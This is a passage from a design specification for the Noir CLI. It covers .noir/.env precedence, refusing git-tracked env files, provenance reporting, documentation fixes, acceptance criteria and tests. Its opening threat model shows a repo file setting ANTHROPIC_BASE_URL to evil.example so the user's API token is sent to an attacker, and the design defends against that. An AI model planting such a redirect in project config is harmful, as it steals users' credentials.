Inverting precedence opens a credential-exfiltration path that fill-only-unset accidentally
closed:

```
untrusted repo contains:  .noir/.env  →  ANTHROPIC_BASE_URL=https://evil.example
user runs:                noir run
result:                   BASE_URL  = evil              (file wins)
                          AUTH_TOKEN = the user's real value  (env fallback)
                          → the user's API key is sent to the attacker's endpoint
```

The attacker never needs to know the token — redirecting the base URL is sufficient, because the
token arrives via the fallback.

**Rule.** Before the file is trusted at all:

| Condition | Behaviour |
|---|---|
| `.noir/.env` is **untracked** by git | trust — the user's own file |
| `.noir/.env` is **tracked** by git | **refuse to load** + warn with the remedy |
| not inside a git repository | trust — nothing arrived from a remote |

Detection: `git ls-files --error-unmatch .noir/.env`, run once per process, bounded, and **never
throwing** — any git failure (absent binary, exotic setup) degrades to *trust*, matching the
"not a git repository" row rather than silently disabling the env file for everyone.

Refusal message names the remedy explicitly:

```
noir: refusing .noir/.env — it is tracked by git. A cloned repository could
redirect credentials through it. Fix: add `.noir/.env` to .gitignore (the managed
block already does) and run `git rm --cached .noir/.env`.
```

The managed `.gitignore` block already carries `/.noir/.env`, so this only triggers for a repo
that deliberately force-added the file or removed the block.

### 12.3 Shadowing diagnostics

A stale machine-global export and a deliberate one-shot override are mechanically
indistinguishable — both arrive as "the real environment" — so under the new rule a shadowed
value is silent no longer the failure mode, but a *forgotten* global still surprises users.

- When a key exists in **both** `.noir/.env` and the real environment **with different values**,
  emit one stderr line naming the **key** and which source won. Never the values.
- `noir doctor` adds a per-key provenance row (§12.4).

### 12.4 Provenance: "which value is in effect"

`loadNoirEnv` currently returns `{ overlay, warnings }`. It gains
`sources: Record<string, 'file' | 'env'>`, recorded at the branch that decides the winner, so the
resolved origin of every key is known without re-reading anything.

New surface — **`noir env`** (read-only, never prints values):

```
KEY                            VALUE         FROM
CLICKUP_API_TOKEN              pk_…(42)      .noir/.env
ANTHROPIC_BASE_URL             https://…     environment  (overrides .noir/.env)
ANTHROPIC_AUTH_TOKEN           sk-…(25)      .noir/.env
NOIR_PROFILE                   work          environment
```

Prior art: `atmos describe component <name> --provenance` reports value origin down to file and
line. `--json` emits the same as `{ok, data:{vars:[{key, source, shadowed, valueLength}]}}`. This
is the command that answers the maintainer's actual failure — "I edited `.noir/.env` and nothing
changed" — with a single line instead of a debugging session.

### 12.5 Doctrine consolidation

Every surface that states where configuration belongs moves to the §12.1 chain, with `.noir/.env`
first and the machine-global files explicitly labelled as shadowing fallbacks.

**Skills** (shipped to the host; an agent reads these at review time):

| File | Defect |
|---|---|
| `packages/skills/integrations/noir-clickup/SKILL.md:36-53` | `.noir/.env` absent from the ordered list; `~/.claude/settings.json` ranked "#1 Primary fix (most reliable)" |
| `.../noir-clickup/SKILL.md:392` | Notes repeat the machine-global-only guidance |
| `.../noir-clickup/references/clickup-api.md:172` | No placement guidance |
| `.../noir-clickup/SKILL.md:307-308` | 401-debug recipe reads raw shell env |
| `packages/skills/builtin/noir-writing-skills/SKILL.md:25-31` | Skill-authoring rules omit where config belongs |
| `packages/skills/builtin/noir-doctor/SKILL.md:11,17-24` | Lists doctor categories but omits `noir-env`/`provider`, and gives no remedy |
| `packages/skills/builtin/noir-context/SKILL.md:33` | Embedder config undocumented |
| `packages/skills/builtin/noir-backend/references/backend-patterns.md:43` | Names `env/config` without naming the file |
| `packages/skills/builtin/noir-security/SKILL.md:28` | Steers away from env vars without distinguishing a 0600 gitignored project file |

**Documentation.** Note the split: `docs/reference/config.md`, `cli.md`, and `mcp-tools.md` are
**whole-file generated** by `scripts/docs-generate.mjs` (`:894-908`, `writeFileSync`). Editing the
`.md` alone is erased by the next `pnpm docs:generate` — the change must land in the generator
(Precedence source `:196-210`, Secrets-policy source `:330-345`). `docs/reference/environment.md`
is hand-authored and is edited directly.

| File | Defect |
|---|---|
| `docs/reference/environment.md:6-11` | Precedence block states only the two-layer rule; no complete chain |
| `docs/reference/environment.md:15-19, :25, :109-111` | Host-global files ordered first in three places |
| `docs/reference/environment.md:38-53` | Provider-key sections give no placement |
| `docs/reference/environment.md:83-102` | Silent on refused (deny-listed) keys |
| `docs/reference/environment.md:3, :88-102` | Claims "every environment variable" but omits `NOIR_SKIP_NODE_PROVISION` (`scripts/install.sh:27,163-165`) |
| `docs/reference/config.md:9-12, :129-130` | Same two defects, **in the generator** |
| `docs/how-to/clickup.md:17-37` | Ranks `settings.json` above `.noir/.env`; contradicts the shipped skill |
| `docs/how-to/host-profiles.md:68-71` | Shell listed before `.noir/.env` |
| `docs/getting-started.md:60-69` | Init table omits `.env.example` |
| `docs/getting-started.md:219-225` | Configuration section has no precedence or recommendation |
| `docs/explanation/privacy.md:38` | Frames `.noir/.env` as a mere fallback; conflates `apiKeyEnv` with `${VAR}` |
| `docs/explanation/architecture.md:46, :54` | The `.noir/` inventory omits `.env`/`.env.example` entirely |
| `docs/reference/mcp-tools.md` (generated) | `integrations_auth` and `noir_clickup_write` descriptions never name placement |
| `packages/create/templates/config.yml.tmpl:1-2` | No pointer to `.env`; the cross-reference runs only one way |

**`apiKeyEnv` is a NAME, not an interpolation.** `packages/model/src/complete.ts:63` does
`process.env[providerCfg.apiKeyEnv]`, so `apiKeyEnv: ${ANTHROPIC_API_KEY}` resolves
`process.env['${ANTHROPIC_API_KEY}']` → `undefined` → a provider with no key, silently. Only
`run.profiles.<name>.env` interpolates (`run-profiles.ts:36`). Three docs currently say otherwise
(`config.md:129-130`, `environment.md:108`, `privacy.md:38`) while `environment.md:40-44` and
`model/src/types.ts:125-128` state it correctly — so the reference page contradicts itself.

### 12.6 Not changing

- **The process-injection denylist stays** (`env-file.ts:35-36`) and is extended, not replaced:
  add `NOIR_DAEMON_DIR` (§4.4). Case-insensitivity on Windows is a separate defect to record.
- **The 0600 permission advisory stays**, and gains teeth: `noir init` now creates the file at
  0600 (§8), so the advisory should fire only for a file the user chmod-ed themselves.
- **Node `--env-file` parsing dialect stays** — only the precedence rank changes.

---

## 13. Part G — `noir run` credential diagnostics

### 13.1 The auth-failure branch covers only one credential shape

`run.ts:135-146` explains the failure only when `process.env.ANTHROPIC_API_KEY` is set
(`run.ts:140`). A user on a custom gateway sets `ANTHROPIC_AUTH_TOKEN` + `ANTHROPIC_BASE_URL` and
**never sees the branch**, so the message reduces to "run `/login`" — the wrong remedy for a
non-interactive API-key setup.

Broaden the branch to any recognised credential shape (`ANTHROPIC_API_KEY`,
`ANTHROPIC_AUTH_TOKEN`, `ANTHROPIC_BASE_URL`), and make the advice name its source: which
variable is set, and whether it came from `.noir/.env` or the environment (§12.4 provenance).

### 13.2 Advice must stay actionable after consolidation

The current text says *"unset it … if you meant to use your subscription"*. Once the key lives in
`.noir/.env`, `applyNoirEnv` re-injects it every invocation, so shell-level unsetting does
nothing. When provenance says the key came from the file, the message must say so and name the
file — otherwise the guidance actively misleads.

### 13.3 Running outside an initialized project

`noir run` deliberately does not require init (`run.ts:78-81`), and that stays. But
`lib-uii-gateway-monev-angular` (§1.8) shows the failure mode: no `.noir/` ⇒ no `.noir/.env` ⇒ no
project credentials ⇒ a login error with no mention of the real gap.

When `noir run` executes where `.noir/` (or `.noir/.env`) is absent, emit one informational line
on stderr — suppressed under `--json` — offering `noir init` and naming `.noir/.env` as the place
project credentials live. Informational only: never a failure, never a prompt.

### 13.4 Never print values

Every message added here names variables and files, never values. Consistent with the existing
"names only, never values" contract (`doctor.ts:329`).

---

## 14. Security & isolation

- **Single writer preserved.** Per-project records make the two-writers-on-one-DB path
  structurally unreachable rather than guarded (§4.3). The migration in §4.5 removes the one
  remaining window (a pre-upgrade daemon).
- **Token never in a config file.** 0600 token file; hosts keep stdio; workspace hosts use
  `headersHelper` (command, not secret).
- **Provenance unchanged.** Part A touches liveness records only; the request-identity stamping
  from ADR-0009 is untouched.
- **No new network surface.** The daemon still binds `127.0.0.1` only; the token narrows access
  to it, it does not expose anything new.
- **Migration never signals a foreign process.** The legacy record's pid is validated with
  `pidAlive` and the SIGTERM is bounded; on timeout the file is removed anyway and the stranded
  daemon exits via its own idle timeout.

---

## 15. Compatibility & migration

This is a **breaking change to the on-disk record layout**. Per the release decision:

- The legacy `~/.noir/daemon.json` is **never read except once** by §4.5, and is deleted.
- Any host `.mcp.json` written for a workspace (`type:'http'`) must be re-established after
  upgrade, because the port and token change. `noir workspace leave` / `join` rewrites it.
- A daemon running from the previous version is retired by §4.5 on the first daemon-touching
  command.
- Release notes must state the manual steps explicitly. `docs/how-to/releasing.md` and
  `CHANGELOG.md` carry the upgrade note.

The **`.noir/.env` precedence inversion (§12.1) is a second, independent breaking change** — it
alters which value wins, so a user who has the same key in both places will observe a different
effective configuration after upgrading. For the maintainer this is the *fix* (their project file
starts being honoured), but it must be called out rather than discovered:

- CHANGELOG gets an explicit **Changed** entry naming the inversion and the shadowing warning.
- `docs/reference/environment.md` carries a short "changed in 1.14.0" note beside the chain.
- The shadowing warning (§12.3) is the runtime signal: a user whose file now overrides a global
  export sees one line saying so, on the first command they run.
- No automatic migration is possible or desirable — Noir cannot know whether a duplicated key is
  a mistake or a deliberate override, and rewriting a user's `.zshrc` or `.noir/.env` is out of
  scope. Detection plus a clear message is the whole remedy.

`noir init --upgrade` (§11) is the recommended post-upgrade step, and `noir doctor`'s existing
scaffold-drift row prompts it.

---

## 16. Acceptance criteria

| # | Criterion |
|---|---|
| A1 | Two projects each start a daemon; both records exist simultaneously under `~/.noir/daemons/` and neither is cleared by the other's activity. |
| A2 | No `wrongProject` branch remains in `ensure.ts` or `commands/daemon.ts`. |
| A3 | `noir daemon stop` in project A signals only A's daemon and leaves B's record and process untouched. |
| A4 | A legacy `~/.noir/daemon.json` is read once: its live daemon receives SIGTERM, the file is removed, and a second invocation is a no-op. |
| A5 | If the legacy daemon does not exit within the bound, the start is **refused** with an actionable message and the legacy record is left in place — no second daemon is started against the held DB. |
| B1 | With `daemon.port: 4321` free, the daemon binds 4321 and the record says 4321. |
| B2 | With 4321 occupied, the daemon binds an ephemeral port, warns, and the record says the **actual** port. |
| B3 | With no `daemon.port`, behaviour is byte-identical to today. |
| C1 | `GET /health` answers without a token; a `/mcp` request without `Authorization` returns 401. |
| C2 | The CLI's tool calls succeed against a token-protected daemon. |
| C3 | The token file is mode 0600 and is regenerated on each daemon start. |
| C4 | A stdio host session is unaffected — no token, no config change, no new failure mode. |
| C5 | A 401 surfaces an actionable message, not a silent failure. |
| D1 | With a configured port and no daemon, the first command connects, fails, spawns, reconnects, and succeeds. |
| D2 | The reconnect backoff is bounded and gives up with a clear error. |
| D3 | `withWorkspaceDaemon` behaviour is unchanged — still probe-only, never auto-starts. |
| E1 | `.env.example` covers the fixed embedder keys, presents the model provider key as an `apiKeyEnv:` example rather than a hard-coded variable, and documents `NOIR_PROFILE` plus the update kill-switches — all commented, with a pointer to `environment.md`. |
| E2 | `noir init` writes `.noir/README.md`; every existing entry's bytes are unchanged. |
| E3 | `.gitignore`'s managed block no longer contains `/.noir/*.sock`, `/.noir/daemon.pid`, or `/.noir/state/`, and `.env.*` / `!.env.example` glob behaviour is covered by a test. |
| E4 | `noir init` creates `.noir/.env` with mode **0600**, containing only comments — loading it yields an empty overlay, so behaviour is unchanged. |
| E5 | On an existing project, `noir init --upgrade` creates every absent `skipIfExists` entry (including `.env`, `.env.example`, `README.md`) and **modifies no existing file** except through `regenerate`/`managedBlock`. |
| E6 | `--upgrade` on a project whose `.noir/.env` already exists leaves it byte-identical (a user's tokens are never touched). |
| E7 | `CURRENT_SCAFFOLD_VERSION` is `1.1.0`, `MIGRATIONS` has a real `1.0.0 → 1.1.0` entry, and `noir doctor` reports drift for a `1.0.0` project. |
| E8 | `--dry-run` reports the backfill as planned writes without touching disk, and does not list an existing `skipIfExists` file. |
| **F1** | A key defined in `.noir/.env` **wins** over the same key in the real environment. |
| **F2** | A key **not** in `.noir/.env` is still read from the real environment (fallback intact). |
| **F3** | A **git-tracked** `.noir/.env` is refused with the remediation message; untracked is trusted; no git repository → trusted; any git failure → trusted. |
| **F4** | When a key is set in both places with different values, one stderr line names the **key** and the winner — never a value. |
| **F5** | `noir env` lists every resolved key with its winning source and any shadowed source; `--json` emits the structured form; **no value is ever printed**. |
| **F6** | `applyNoirEnv` mutates only Noir's own process environment — a sibling `claude` invocation in the same shell sees the unmodified shell environment. |
| **F7** | `run.profiles.<name>.env` still merges **over** the result (the documented exception is preserved). |
| **F8** | `apiKeyEnv` is documented as a bare NAME everywhere; no doc shows `apiKeyEnv: ${VAR}`. |
| **F9** | The generated pages (`config.md`, `cli.md`, `mcp-tools.md`) are correct **after** `pnpm docs:generate` — verified by regenerating and diffing, not by reading the `.md`. |
| **G1** | A failed `noir run` auth with `ANTHROPIC_AUTH_TOKEN`/`ANTHROPIC_BASE_URL` set produces the credential guidance (it does not today). |
| **G2** | When the credential came from `.noir/.env`, the message names the file, so the advice is actionable. |
| **G3** | `noir run` outside an initialized project emits one informational stderr line offering `noir init`; suppressed under `--json`; never fails the run. |
| **G4** | No message added by G prints a credential value. |

**Separable.** D1–D3 are the item to defer if the slice needs to shrink. A–C, E, F and G each
stand alone; F is the highest-value part (it is the maintainer's actual failure) and E5–E7 is the
part that repairs projects already on disk.

---

## 17. Testing plan (offline — never needs network or a key)

- **Isolation (A1–A3).** Two project fixtures in one tmp HOME; assert both records coexist, that
  A's activity never removes B's record, and that `daemon stop` in A leaves B's record and pid.
  This is the regression test for the §1.1 failure chain.
- **Migration (A4–A5).** Seed a fake legacy record pointing at a spawned sleeping child; assert
  SIGTERM is delivered, the file is removed, and the second call is a no-op. Separately, point the
  record at a child that **ignores SIGTERM**; assert the call rejects with the actionable message,
  that the legacy record still exists, and that **no daemon was started** — the two-writer
  regression guard for the timeout path.
- **Port (B1–B3).** Bind a socket to occupy a port, then start with it configured; assert the
  fallback, the warning, and the truthful record. Assert the unset case is unchanged.
- **Token (C1–C5).** HTTP-level assertions: `/health` without a token, `/mcp` without → 401, with
  → success. Assert file mode via `statSync`. Assert the stdio path constructs no token.
- **Activation (D1–D3).** Point at a closed port; assert spawn-then-succeed and the backoff cap.
  Assert `withWorkspaceDaemon` still refuses to auto-start when its daemon is down.
- **Init (E1–E4).** Assert `.env.example` content and `.noir/README.md` presence via the scaffold
  result; assert `.noir/.env` exists with mode 0600 and loads to an **empty** overlay; assert the
  updated parity gates; assert the managed ignore block's exact contents, including that
  `.env.local` matches the ignore glob while `.env.example` does not.
- **Upgrade (E5–E8).** Build a fixture project at scaffold-version `1.0.0` with `.noir/.env`
  present and `.env.example`/`README.md` absent, then `--upgrade`; assert the absent seeds are
  created, the existing `.env` is byte-identical (hash before/after), the version stamp becomes
  `1.1.0`, the migration is idempotent on a second run, and `--dry-run` lists the same files
  while writing none. This is the regression test for §1.6.
- **Precedence (F1–F2, F7).** In a child process: set a key in both `.noir/.env` and the ambient
  env and assert the file wins; remove it from the file and assert the ambient value returns;
  assert a profile `env` still overrides both.
- **Tracked refusal (F3).** A real tmp git repo: untracked `.noir/.env` → loaded; after
  `git add -f .noir/.env` → refused, with the message asserted and the value **not** applied.
  Plus a non-repo tmpdir → trusted.
- **Shadowing + provenance (F4–F5).** Assert the stderr line names the key and **not** the value
  (assert the value string is absent from all output); assert `noir env` and its `--json` form
  report source per key and never emit a value.
- **Non-disturbance (F6).** Assert that after `applyNoirEnv`, a spawned sibling process started
  from the *unmodified* ambient env does not see the overlay — i.e. the overlay is confined to
  Noir's own tree.
- **Generated-docs integrity (F9).** Run `pnpm docs:generate` in CI order and assert the generated
  pages contain the new precedence text — the test that would have caught editing the `.md`
  directly.
- **`noir run` diagnostics (G1–G4).** Drive the failure branch with each credential shape and
  assert the guidance appears; assert the `.noir/.env` source is named when applicable; assert the
  uninitialized-project notice goes to stderr and is absent under `--json`; assert no output
  contains a value. Follows the existing `run.test.ts` mocking pattern — no real host is spawned.

Every test uses `NOIR_DAEMON_DIR` against a tmp HOME — no real `~/.noir`, no ports left bound, no
network. The git-tracked tests create a throwaway repo under the tmp root and never touch the
Noir repo's own git state.

---

## 18. Documentation plan

### 18.1 The missing page: how to configure `.noir/.env`

`.noir/.env` is referenced in six user-facing files and documented **in none of them** — every
mention is an aside inside a page about something else (`environment.md:6, :25, :109-112`,
`config.md:9, :130`, `getting-started.md:224`, `clickup.md:28-32`, `host-profiles.md:70`,
`privacy.md:38`). There is no page a user can be pointed to for "how do I configure this project".

**New page: `docs/how-to/configure-env.md`.** It is the canonical how-to and covers:

1. **What the file is for** — project-scoped configuration and secrets; what belongs there and
   what does not (theme/UI preferences, machine-wide values).
2. **Creating it** — it now exists after `noir init`; otherwise create it by hand and
   `chmod 600`. Include the one-liner.
3. **The precedence chain** — §12.1 verbatim, with the shadowing rule called out.
4. **Seeing what is in effect** — `noir env`, with example output, and `noir doctor`'s
   provenance rows.
5. **Common recipes** — integration token (ClickUp), model provider key (and the `apiKeyEnv`
   NAME-not-interpolation trap), embedder key, run-profile host selection, `NOIR_PROFILE`.
6. **Safety** — gitignored by the managed block, 0600, the deny-list, and why a git-tracked
   `.noir/.env` is refused.
7. **Troubleshooting** — "I edited it and nothing changed" (shadowing), "still `no-token`"
   (daemon env is a spawn-time snapshot → restart), "my repo's `.noir/.env` was ignored"
   (tracked-file refusal).

It is linked from `getting-started.md`'s Configuration section, `environment.md`'s precedence
block, `config.md`'s Secrets policy (via the generator), and the clickup how-to.

### 18.2 Existing pages to correct

The itemised defect list is **§12.5** — 14 doc/template items plus the 9 skills. Two structural
rules apply and are easy to get wrong:

- **`docs/reference/config.md`, `cli.md`, `mcp-tools.md` are whole-file generated** by
  `scripts/docs-generate.mjs`. Edit the generator; the `.md` is overwritten. Verify by running
  `pnpm docs:generate` and diffing (acceptance F9).
- **`docs/reference/environment.md` is hand-authored** and is edited directly, despite living in
  the same directory.

### 18.3 Pages this slice adds or changes for the daemon work

- `docs/reference/config.md` (generator) — `daemon.port` loses "not yet wired"; document the
  preference-not-demand semantics and the ephemeral fallback, and remove it from the "Honest
  notes" list of unconsumed fields (`config.md:136-138`).
- `docs/reference/environment.md` — add `NOIR_DAEMON_DIR`; mark `NOIR_DAEMON_JSON` legacy-only;
  add `NOIR_SKIP_NODE_PROVISION`; document the http-transport token.
- `docs/explanation/architecture.md` — the per-project record layout, the token, **and the
  `.noir/` inventory that currently omits `.env`/`.env.example`** (`:46, :54`).
- `docs/how-to/shared-workspaces.md` — the workspace token and `headersHelper` guidance.
- `docs/how-to/installation.md` — the manifest/upgrade behaviour (§11).

### 18.4 Roadmap, decision records, release

- `docs/roadmap/capability-05-runtime-infrastructure.md` — move the reconciled `DONE-WHEN` items
  out of "Gap / roadmap delta".
- `docs/roadmap/backlog.md` — resolve the ignore-list cleanup entry; record every deferral.
- `docs/decisions/0010-*.md` — the daemon ADR (§20).
- `docs/decisions/0011-*.md` — the `.noir/.env` precedence + doctrine ADR (§20).
- `CHANGELOG.md` + `docs/how-to/releasing.md` — the upgrade note and the **Changed** entry for the
  precedence inversion (§15).

### 18.5 Accuracy rule for every page touched

Every statement must be checked against the code, not against another doc. The failures this
slice exists to fix were all of one kind: a document asserting a rule the code did not implement
(`apiKeyEnv` as `${VAR}`, "real env always wins" as doctrine, `.noir/.env` as a last-resort
fallback). `pnpm docs:validate` catches broken links and stale version refs; it does **not** catch
a confidently wrong sentence, so each page is verified against the source it describes.

---

## 19. Implementation slices (for the plan phase)

1. **A — records.** `project-record.ts`, `NOIR_DAEMON_DIR`, consumer updates, `probeDaemon`
   reordering, guard removal, migration, tests.
2. **B — port.** Config describe, threading, `EADDRINUSE` fallback, tests.
3. **C — token.** Generation, 0600 file, `/mcp` enforcement, CLI `requestInit`, `noir daemon
   token`, workspace parity, tests.
4. **D — activation.** Connect-first ordering, bounded retry, workspace-path guard test.
5. **E — init completeness.** `.env.example` doctrine + full variable set, `.noir/.env` creation
   at 0600, `.noir/README.md`, ignore-list cleanup, parity-gate updates.
6. **E4 — upgrade backfill.** Full-manifest emission on `--upgrade`, `CURRENT_SCAFFOLD_VERSION`
   `1.0.0 → 1.1.0`, the first real `1.0.0 → 1.1.0` migration, dry-run reporting, tests. Depends
   on 5 (it backfills what 5 adds).
7. **F — `.noir/.env` consolidation.** Precedence inversion, tracked-file refusal, shadowing
   diagnostics, provenance (`loadNoirEnv.sources` + `noir env`), denylist addition. The
   highest-risk slice: it changes a documented contract, so it lands with its ADR.
8. **F-docs — doctrine consolidation.** The 9 skills, the 14 doc/template items, and the
   `scripts/docs-generate.mjs` generator edits. Depends on 7 (the wording must match the shipped
   rule).
9. **G — `noir run` diagnostics.** Broadened auth branch, `.noir/.env` sourcing, uninitialized
   notice. Depends on 7 for provenance.
10. **Docs accuracy audit + roadmap sync + ADR-0010/0011 + release notes.**

Sequencing rationale: A first (everything else reads records), then B (D depends on it), then C
(independent), then D. E and E4 are a pair and are independent of A–D. F must precede F-docs and
G. Every slice is independently testable and revertible; 5+6 and 7+8 are the two natural
ship-together groups.

### 19.1 Ordering constraint worth stating

Slice 7 (precedence inversion) **changes behaviour users can observe**, and slice 8 documents it.
Shipping 7 without 8 leaves the docs actively wrong; shipping 8 without 7 documents a rule that
does not exist. They are one release unit even though they are two commits.

---

## 20. Resolved design decisions (record for ADR-0010 + ADR-0011)

1. **Per-project records over a keyed registry.** A `Record<projectId, rec>` in one file would
   still be one file to corrupt and one lock to contend on; separate files mirror the existing
   `workspace-record.ts` precedent and make foreign-record access impossible by construction,
   not by guard.
2. **The legacy record is read exactly once, by a self-deleting migration.** A permanent compat
   path was rejected; a pure "delete and document" was rejected because it leaves a
   two-writer window (bounded at `idleTimeoutSec`, but real).
3. **`daemon.port` is a preference.** A bind conflict degrades to ephemeral with a warning rather
   than failing the command; the record always names the bound port.
4. **Auth on the HTTP transport only.** stdio has no network surface; the anchor host has open
   header-forwarding bugs; a token in `.mcp.json` is a secret in a committable file.
5. **The token is a 0600 file read by clients, never a config value.** Workspace hosts use
   `headersHelper`, which stores a command rather than a secret.
6. **Activation is client-side and cross-platform.** systemd socket units and launchd plists are
   Linux/macOS-only, add a service-management surface Noir does not have, and give Windows
   nothing.
7. **The workspace path is exempt from auto-activation.** ADR-0009 §11 chose probe-only; this
   slice does not reopen it.
8. **Runtime directories are documented, not created eagerly.** They are gitignored, so
   `.gitkeep` would be ignored too; a README explains the map instead.
9. **`--upgrade` emits every manifest mode, rather than gaining a new "backfill" mode.**
   `skipIfExists` already means "create only if absent, never modify" — running it during upgrade
   is safe by construction, so a fourth mode would add surface without adding safety.
10. **`.noir/.env` wins over the real environment for the keys it defines.** Project scope beats
    machine scope for project configuration; the research finds this in Claude Code's own settings
    model and in 1Password's documented `op run` precedence. Fill-only-unset is the correct rule
    for *ambient* overrides, not for a project's own declared configuration.
11. **`applyNoirEnv` stays confined to Noir's own process tree.** The precedence change is a
    *read* ordering, never a write-back — that is what keeps a user's manual, multi-profile
    `claude` invocations working unchanged.
12. **A git-tracked `.noir/.env` is refused.** Inverting precedence creates a credential-
    exfiltration path (redirect the base URL, harvest the token via the fallback); the tracked
    check separates "my local file" from "a file that arrived with the clone" without denying the
    feature. Detection failure degrades to *trust*, so an exotic git setup cannot silently disable
    the env file.
13. **Provenance is a first-class surface (`noir env`), not a debugging burden.** The maintainer's
    failure was "I edited the file and nothing changed" — a question only a source-reporting
    command can answer. Prior art: `atmos describe component --provenance`.
14. **Generated docs are fixed in the generator.** `config.md`/`cli.md`/`mcp-tools.md` are
    whole-file emitted by `scripts/docs-generate.mjs`; a `.md`-only edit is silently reverted,
    so the acceptance test regenerates and diffs rather than reading the file.
15. **No value is ever printed** by any diagnostic added here — the existing "names only, never
    values" contract (`doctor.ts:329`) is extended to `noir env`, the shadowing warning, and the
    `noir run` messages.
